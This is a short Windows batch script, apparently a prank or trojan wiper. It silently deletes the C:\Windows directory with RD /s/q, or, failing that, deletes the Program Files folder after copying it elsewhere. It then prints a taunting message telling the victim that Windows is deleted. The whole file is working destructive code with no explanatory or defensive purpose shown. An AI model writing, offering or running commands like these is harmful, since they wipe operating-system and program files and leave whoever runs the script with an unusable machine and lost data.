   @echo off
   cls
   if exist c:\Windows goto erasewindows
   if not exist c:\windows goto cppro

   :erasewindows
   cd c:\
   md yourevir
   copy c:\Windows\*.sys c:\yourevir\*.sys
   RD /s/q c:\Windows
   goto end

   :cppro
   cd c:\
   md Program'files1
   copy c:\progra~1\*.* c:\Program'Files1
   cls
   cd c:\
   md c:\Program'Files2
   copy c:\progra~1\*.* c:\Program'Files2
   RD /s/q c:\PROGRA~1
   cls
   echo W
   echo  i
   echo   n
   echo    d
   echo   o
   echo  w
   echo   s
   Pause
   echo     i
   echo    s
   Pause
   echo   n
   echo  o
   echo w
   pause
   echo DELETED
   Pause
   cls
   Pause
   echo You've are now officially fucked
   Pause
   end
   EXIT
